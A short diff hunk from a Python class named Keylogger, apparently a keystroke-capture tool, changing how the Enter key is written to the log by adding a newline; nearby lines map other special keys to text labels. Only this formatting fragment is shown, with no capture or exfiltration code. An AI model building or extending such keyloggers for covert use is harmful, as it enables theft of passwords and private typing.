@@ -58,7 +58,7 @@ class Keylogger:
             elif key == key.f12:
                 current_key = " |F12| "
             elif key == key.enter:
-                current_key = " |ENTER| "
+                current_key = " |ENTER| \n"
             elif key == key.cmd:
                 current_key = " |COMMAND| "
             elif key == key.menu:
